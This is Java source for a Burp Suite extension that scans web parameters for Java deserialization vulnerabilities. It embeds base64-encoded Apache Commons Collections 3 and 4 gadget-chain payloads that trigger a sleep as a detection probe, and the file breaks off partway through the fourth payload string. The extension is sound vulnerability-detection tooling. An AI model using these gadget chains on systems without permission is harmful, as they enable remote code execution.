package burp;

import java.io.PrintWriter;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import java.util.Set;
import java.util.concurrent.TimeUnit;

import org.apache.commons.codec.binary.Base64;
import org.apache.commons.lang3.ArrayUtils;

public class BurpExtender implements IBurpExtender, IScannerCheck {
	
    private IBurpExtenderCallbacks callbacks;
    private IExtensionHelpers helpers;
    
    private PrintWriter stdout;
    private PrintWriter stderr;
    
    private byte[] serializeMagic = new byte[]{-84, -19};
    private byte[] base64Magic = {(byte)0x72, (byte)0x4f, (byte)0x30, (byte)0x41};
    
    private HashMap<String,byte[]> payloads;
    
    private String activeScanIssue;
    private String activeScanSeverity;
    private String activeScanConfidence;
    private String activeScanIssueDetail;
    private String activeScanRemediationDetail;
    
    private String passiveScanIssue;
    private String passiveScanSeverity;
    private String passiveScanConfidence;
    private String passiveScanIssueDetail;
    private String passiveScanRemediationDetail;    
        
    /*
     * TODO
     * - This version active check for Deserialization Vulnerability IF AND ONLY IF
     * the base value is already a serialized Java Object. Maybe can be useful to add
     * a further mode in which the vulnerability is checked on every parameter, despite
     * on its base value.
     * - Maybe search also in headers (I don't know if Burp set all headers as intertion
     * points...)
     */    
    
    @Override
    public void registerExtenderCallbacks(final IBurpExtenderCallbacks callbacks)
    {
        // Keep a reference to our callbacks object
        this.callbacks = callbacks;
        
        // Obtain an extension helpers object
        helpers = callbacks.getHelpers();
        
        // Set our extension name
        callbacks.setExtensionName("Java Deserialization Scanner");
        
        // Register ourselves as a custom scanner check
        callbacks.registerScannerCheck(this);
        
        // Initialize stdout and stderr
        stdout = new PrintWriter(callbacks.getStdout(), true);
        stderr = new PrintWriter(callbacks.getStderr(), true);  
        
        // Initialize the payloads
        payloads = new HashMap<String,byte[]>();
        payloads.put("Apache Commons Collections 3", Base64.decodeBase64("rO0ABXNyADJzdW4ucmVmbGVjdC5hbm5vdGF0aW9uLkFubm90YXRpb25JbnZvY2F0aW9uSGFuZGxlclXK9Q8Vy36lAgACTAAMbWVtYmVyVmFsdWVzdAAPTGphdmEvdXRpbC9NYXA7TAAEdHlwZXQAEUxqYXZhL2xhbmcvQ2xhc3M7eHBzfQAAAAEADWphdmEudXRpbC5NYXB4cgAXamF2YS5sYW5nLnJlZmxlY3QuUHJveHnhJ9ogzBBDywIAAUwAAWh0ACVMamF2YS9sYW5nL3JlZmxlY3QvSW52b2NhdGlvbkhhbmRsZXI7eHBzcQB+AABzcgAqb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLm1hcC5MYXp5TWFwbuWUgp55EJQDAAFMAAdmYWN0b3J5dAAsTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ2hhaW5lZFRyYW5zZm9ybWVyMMeX7Ch6lwQCAAFbAA1pVHJhbnNmb3JtZXJzdAAtW0xvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHB1cgAtW0xvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuVHJhbnNmb3JtZXI7vVYq8dg0GJkCAAB4cAAAAARzcgA7b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNvbnN0YW50VHJhbnNmb3JtZXJYdpARQQKxlAIAAUwACWlDb25zdGFudHQAEkxqYXZhL2xhbmcvT2JqZWN0O3hwdnIAEGphdmEubGFuZy5UaHJlYWQAAAAAAAAAAAAAAHhwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5JbnZva2VyVHJhbnNmb3JtZXKH6P9re3zOOAIAA1sABWlBcmdzdAATW0xqYXZhL2xhbmcvT2JqZWN0O0wAC2lNZXRob2ROYW1ldAASTGphdmEvbGFuZy9TdHJpbmc7WwALaVBhcmFtVHlwZXN0ABJbTGphdmEvbGFuZy9DbGFzczt4cHVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAJ0AAVzbGVlcHVyABJbTGphdmEubGFuZy5DbGFzczurFteuy81amQIAAHhwAAAAAXZyAARsb25nAAAAAAAAAAAAAAB4cHQACWdldE1ldGhvZHVxAH4AHgAAAAJ2cgAQamF2YS5sYW5nLlN0cmluZ6DwpDh6O7NCAgAAeHB2cQB+AB5zcQB+ABZ1cQB+ABsAAAACdXEAfgAeAAAAAXEAfgAhdXEAfgAbAAAAAXNyAA5qYXZhLmxhbmcuTG9uZzuL5JDMjyPfAgABSgAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAAAAAAnEHQABmludm9rZXVxAH4AHgAAAAJ2cgAQamF2YS5sYW5nLk9iamVjdAAAAAAAAAAAAAAAeHB2cQB+ABtzcQB+ABFzcgARamF2YS5sYW5nLkludGVnZXIS4qCk94GHOAIAAUkABXZhbHVleHEAfgAsAAAAAXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAABAAAAAAeHh2cgASamF2YS5sYW5nLk92ZXJyaWRlAAAAAAAAAAAAAAB4cHEAfgA5"));
        payloads.put("Apache Commons Collections 3 Alternate payload", Base64.decodeBase64("rO0ABXNyADJzdW4ucmVmbGVjdC5hbm5vdGF0aW9uLkFubm90YXRpb25JbnZvY2F0aW9uSGFuZGxlclXK9Q8Vy36lAgACTAAMbWVtYmVyVmFsdWVzdAAPTGphdmEvdXRpbC9NYXA7TAAEdHlwZXQAEUxqYXZhL2xhbmcvQ2xhc3M7eHBzfQAAAAEADWphdmEudXRpbC5NYXB4cgAXamF2YS5sYW5nLnJlZmxlY3QuUHJveHnhJ9ogzBBDywIAAUwAAWh0ACVMamF2YS9sYW5nL3JlZmxlY3QvSW52b2NhdGlvbkhhbmRsZXI7eHBzcQB+AABzcgAqb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLm1hcC5MYXp5TWFwbuWUgp55EJQDAAFMAAdmYWN0b3J5dAAsTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ2hhaW5lZFRyYW5zZm9ybWVyMMeX7Ch6lwQCAAFbAA1pVHJhbnNmb3JtZXJzdAAtW0xvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHB1cgAtW0xvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuVHJhbnNmb3JtZXI7vVYq8dg0GJkCAAB4cAAAAAJzcgA7b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNvbnN0YW50VHJhbnNmb3JtZXJYdpARQQKxlAIAAUwACWlDb25zdGFudHQAEkxqYXZhL2xhbmcvT2JqZWN0O3hwdnIAN2NvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRyQVhGaWx0ZXIAAAAAAAAAAAAAAHhwc3IAPm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5JbnN0YW50aWF0ZVRyYW5zZm9ybWVyNIv0f6SG0DsCAAJbAAVpQXJnc3QAE1tMamF2YS9sYW5nL09iamVjdDtbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAXNyADpjb20uc3VuLm9yZy5hcGFjaGUueGFsYW4uaW50ZXJuYWwueHNsdGMudHJheC5UZW1wbGF0ZXNJbXBsCVdPwW6sqzMDAAZJAA1faW5kZW50TnVtYmVySQAOX3RyYW5zbGV0SW5kZXhbAApfYnl0ZWNvZGVzdAADW1tCWwAGX2NsYXNzcQB+ABhMAAVfbmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO0wAEV9vdXRwdXRQcm9wZXJ0aWVzdAAWTGphdmEvdXRpbC9Qcm9wZXJ0aWVzO3hwAAAAAP////91cgADW1tCS/0ZFWdn2zcCAAB4cAAAAAJ1cgACW0Ks8xf4BghU4AIAAHhwAAAGPMr+ur4AAAAyADMHADEBADN5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJFN0dWJUcmFuc2xldFBheWxvYWQHAAQBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0BwAGAQAUamF2YS9pby9TZXJpYWxpemFibGUBABBzZXJpYWxWZXJzaW9uVUlEAQABSgEADUNvbnN0YW50VmFsdWUFrSCT85Hd7z4BAAY8aW5pdD4BAAMoKVYBAARDb2RlCgADABAMAAwADQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBADVMeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRTdHViVHJhbnNsZXRQYXlsb2FkOwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACkV4Y2VwdGlvbnMHABkBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApTb3VyY2VGaWxlAQAMR2FkZ2V0cy5qYXZhAQAMSW5uZXJDbGFzc2VzBwAnAQAfeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cwEAE1N0dWJUcmFuc2xldFBheWxvYWQBAAg8Y2xpbml0PgEAEGphdmEvbGFuZy9UaHJlYWQHACoBAAVzbGVlcAEABChKKVYMACwALQoAKwAuAQANU3RhY2tNYXBUYWJsZQEAHnlzb3NlcmlhbC9Qd25lcjI2NzQwMzEyODkyMDY4NgEAIEx5c29zZXJpYWwvUHduZXIyNjc0MDMxMjg5MjA2ODY7ACEAAQADAAEABQABABoABwAIAAEACQAAAAIACgAEAAEADAANAAEADgAAAC8AAQABAAAABSq3AA+xAAAAAgARAAAABgABAAAAJQASAAAADAABAAAABQATADIAAAABABUAFgACABcAAAAEAAEAGAAOAAAAPwAAAAMAAAABsQAAAAIAEQAAAAYAAQAAACgAEgAAACAAAwAAAAEAEwAyAAAAAAABABoAGwABAAAAAQAcAB0AAgABABUAHgACABcAAAAEAAEAGAAOAAAASQAAAAQAAAABsQAAAAIAEQAAAAYAAQAAACsAEgAAACoABAAAAAEAEwAyAAAAAAABABoAGwABAAAAAQAfACAAAgAAAAEAIQAiAAMACAApAA0AAQAOAAAAIgADAAIAAAANpwADAUwRJxCFuAAvsQAAAAEAMAAAAAMAAQMAAgAjAAAAAgAkACUAAAAKAAEAAQAmACgACXVxAH4AIwAAAdTK/rq+AAAAMgAbBwACAQAjeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb28HAAQBABBqYXZhL2xhbmcvT2JqZWN0BwAGAQAUamF2YS9pby9TZXJpYWxpemFibGUBABBzZXJpYWxWZXJzaW9uVUlEAQABSgEADUNvbnN0YW50VmFsdWUFceZp7jxtRxgBAAY8aW5pdD4BAAMoKVYBAARDb2RlCgADABAMAAwADQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBACVMeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb287AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQEADElubmVyQ2xhc3NlcwcAGQEAH3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMBAANGb28AIQABAAMAAQAFAAEAGgAHAAgAAQAJAAAAAgAKAAEAAQAMAA0AAQAOAAAALwABAAEAAAAFKrcAD7EAAAACABEAAAAGAAEAAAAvABIAAAAMAAEAAAAFABMAFAAAAAIAFQAAAAIAFgAXAAAACgABAAEAGAAaAAlwdAAEUHducnB3AQB4dXIAEltMamF2YS5sYW5nLkNsYXNzO6sW167LzVqZAgAAeHAAAAABdnIAHWphdmF4LnhtbC50cmFuc2Zvcm0uVGVtcGxhdGVzAAAAAAAAAAAAAAB4cHNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAABAAAAAAeHh2cgASamF2YS5sYW5nLk92ZXJyaWRlAAAAAAAAAAAAAAB4cHEAfgAu"));
        payloads.put("Apache Commons Collections 4", Base64.decodeBase64("rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAQm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuY29tcGFyYXRvcnMuVHJhbnNmb3JtaW5nQ29tcGFyYXRvci/5hPArsQjMAgACTAAJZGVjb3JhdGVkcQB+AAFMAAt0cmFuc2Zvcm1lcnQALUxvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnM0L1RyYW5zZm9ybWVyO3hwc3IAQG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuY29tcGFyYXRvcnMuQ29tcGFyYWJsZUNvbXBhcmF0b3L79JkluG6xNwIAAHhwc3IAO29yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuZnVuY3RvcnMuSW52b2tlclRyYW5zZm9ybWVyh+j/a3t8zjgCAANbAAVpQXJnc3QAE1tMamF2YS9sYW5nL09iamVjdDtMAAtpTWV0aG9kTmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sAC2lQYXJhbVR5cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAAAdAAObmV3VHJhbnNmb3JtZXJ1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAB3BAAAAANzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3EAfgALTAAFX25hbWVxAH4ACkwAEV9vdXRwdXRQcm9wZXJ0aWVzdAAWTGphdmEvdXRpbC9Qcm9wZXJ0aWVzO3hwAAAAAP////91cgADW1tCS/0ZFWdn2zcCAAB4cAAAAAJ1cgACW0Ks8xf4BghU4AIAAHhwAAAGPMr+ur4AAAAyADMHADEBADN5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJFN0dWJUcmFuc2xldFBheWxvYWQHAAQBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0BwAGAQAUamF2YS9pby9TZXJpYWxpemFibGUBABBzZXJpYWxWZXJzaW9uVUlEAQABSgEADUNvbnN0YW50VmFsdWUFrSCT85Hd7z4BAAY8aW5pdD4BAAMoKVYBAARDb2RlCgADABAMAAwADQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBADVMeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRTdHViVHJhbnNsZXRQYXlsb2FkOwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACkV4Y2VwdGlvbnMHABkBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApTb3VyY2VGaWxlAQAMR2FkZ2V0cy5qYXZhAQAMSW5uZXJDbGFzc2VzBwAnAQAfeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cwEAE1N0dWJUcmFuc2xldFBheWxvYWQBAAg8Y2xpbml0PgEAEGphdmEvbGFuZy9UaHJlYWQHACoBAAVzbGVlcAEABChKKVYMACwALQoAKwAuAQANU3RhY2tNYXBUYWJsZQEAHnlzb3NlcmlhbC9Qd25lcjI2NzM5NDI0NzM0MDY0NgEAIEx5c29zZXJpYWwvUHduZXIyNjczOTQyNDczNDA2NDY7ACEAAQADAAEABQABABoABwAIAAEACQAAAAIACgAEAAEADAANAAEADgAAAC8AAQABAAAABSq3AA+xAAAAAgARAAAABgABAAAAJQASAAAADAABAAAABQATADIAAAABABUAFgACABcAAAAEAAEAGAAOAAAAPwAAAAMAAAABsQAAAAIAEQAAAAYAAQAAACgAEgAAACAAAwAAAAEAEwAyAAAAAAABABoAGwABAAAAAQAcAB0AAgABABUAHgACABcAAAAEAAEAGAAOAAAASQAAAAQAAAABsQAAAAIAEQAAAAYAAQAAACsAEgAAACoABAAAAAEAEwAyAAAAAAABABoAGwABAAAAAQAfACAAAgAAAAEAIQAiAAMACAApAA0AAQAOAAAAIgADAAIAAAANpwADAUwRJxCFuAAvsQAAAAEAMAAAAAMAAQMAAgAjAAAAAgAkACUAAAAKAAEAAQAmACgACXVxAH4AGAAAAdTK/rq+AAAAMgAbBwACAQAjeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb28HAAQBABBqYXZhL2xhbmcvT2JqZWN0BwAGAQAUamF2YS9pby9TZXJpYWxpemFibGUBABBzZXJpYWxWZXJzaW9uVUlEAQABSgEADUNvbnN0YW50VmFsdWUFceZp7jxtRxgBAAY8aW5pdD4BAAMoKVYBAARDb2RlCgADABAMAAwADQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBACVMeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb287AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQEADElubmVyQ2xhc3NlcwcAGQEAH3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMBAANGb28AIQABAAMAAQAFAAEAGgAHAAgAAQAJAAAAAgAKAAEAAQAMAA0AAQAOAAAALwABAAEAAAAFKrcAD7EAAAACABEAAAAGAAEAAAAvABIAAAAMAAEAAAAFABMAFAAAAAIAFQAAAAIAFgAXAAAACgABAAEAGAAaAAlwdAAEUHducnB3AQB4c3IAEWphdmEubGFuZy5JbnRlZ2VyEuKgpPeBhzgCAAFJAAV2YWx1ZXhyABBqYXZhLmxhbmcuTnVtYmVyhqyVHQuU4IsCAAB4cAAAAAF4"));
        payloads.put("Apache Commons Collections 4 Alternate payload", Base64.decodeBase64("rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAQm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuY29tcGFyYXRvcnMuVHJhbnNmb3JtaW5nQ29tcGFyYXRvci/5hPArsQjMAgACTAAJZGVjb3JhdGVkcQB+AAFMAAt0cmFuc2Zvcm1lcnQALUxvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnM0L1RyYW5zZm9ybWVyO3hwc3IAQG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuY29tcGFyYXRvcnMuQ29tcGFyYWJsZUNvbXBhcmF0b3L79JkluG6xNwIAAHhwc3IAO29yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuZnVuY3RvcnMuQ2hhaW5lZFRyYW5zZm9ybWVyMMeX7Ch6lwQCAAFbAA1pVHJhbnNmb3JtZXJzdAAuW0xvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnM0L1RyYW5zZm9ybWVyO3hwdXIALltMb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zNC5UcmFuc2Zvcm1lcjs5gTr7CNo/pQIAAHhwAAAAAnNyADxvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnM0LmZ1bmN0b3JzLkNvbnN0YW50VHJhbnNmb3JtZXJYdpARQQKxlAIAAUwACWlDb25zdGFudHQAEkxqYXZhL2xhbmcvT2JqZWN0O3hwdnIAN2NvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRyQVhGaWx0ZXIAAAAAAAAAAAAAAHhwc3IAP29yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuZnVuY3RvcnMuSW5zdGFudGlhdGVUcmFuc2Zvcm1lcjSL9H+khtA7AgACWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7WwALaVBhcmFtVHlwZXN0ABJbTGphdmEvbGFuZy9DbGFzczt4cHVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAFzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3EAfgAUTAAFX25hbWV0ABJMamF2YS9sYW5nL1N0cmluZztMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAD/////dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAACdXIAAltCrPMX+AYIVOACAAB4cAAABjzK/rq+AAAAMgAzBwAxAQAzeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRTdHViVHJhbnNsZXRQYXlsb2FkBwAEAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAcABgEAFGphdmEvaW8vU2VyaWFsaXphYmxlAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBa0gk/OR3e8+AQAGPGluaXQ+AQADKClWAQAEQ29kZQoAAwAQDAAMAA0BAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQA1THlzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkU3R1YlRyYW5zbGV0UGF5bG9hZDsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAApFeGNlcHRpb25zBwAZAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQEADElubmVyQ2xhc3NlcwcAJwEAH3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMBABNTdHViVHJhbnNsZXRQYXlsb2FkAQAIPGNsaW5pdD4BABBqYXZhL2xhbmcvVGhyZWFkBwAqAQAFc2xlZXABAAQoSilWDAAsAC0KACsALgEADVN0YWNrTWFwVGFibGUBAB55c29zZXJpYWwvUHduZXIyNjc0MTE5NDQxNzA2MDEBACBMeXNvc2VyaWFsL1B3bmVyMjY3NDExOTQ0MTcwNjAxOwAhAAEAAwABAAUAAQAaAAcACAABAAkAAAACAAoABAABAAwADQABAA4AAAAvAAEAAQAAAAUqtwAPsQAAAAIAEQAAAAYAAQAAACUAEgAAAAwAAQAAAAUAEwAyAAAAAQAVABYAAgAXAAAABAABABgADgAAAD8AAAADAAAAAbEAAAACABEAAAAGAAEAAAAoABIAAAAgAAMAAAABABMAMgAAAAAAAQAaABsAAQAAAAEAHAAdAAIAAQAVAB4AAgAXAAAABAABABgADgAAAEkAAAAEAAAAAbEAAAACABEAAAAGAAEAAAArABIAAAAqAAQAAAABABMAMgAAAAAAAQAaABsAAQAAAAEAHwAgAAIAAAABACEAIgADAAgAKQANAAEADgAAACIAAwACAAAADacAAwFMEScQhbgAL7EAAAABADAAAAADAAEDAAIAIwAAAAIAJAAlAAAACgABAAEAJgAoAAl1cQB+AB8AAAHUyv66vgAAADIAGwcAAgEAI3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkRm9vBwAEAQAQamF2YS9sYW5nL09iamVjdAcABgEAFGphdmEvaW8vU2VyaWFsaXphYmxlAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBXHmae48bUcYAQAGPGluaXQ+AQADKClWAQAEQ29kZQoAAwAQDAAMAA0BAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAlTHlzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkRm9vOwEAClNvdXJjZUZpbGUBAAxHYWRnZXRzLmphdmEBAAxJbm5lckNsYXNzZXMHABkBAB95c29zZXJpYWwvcGF5bG9hZHMv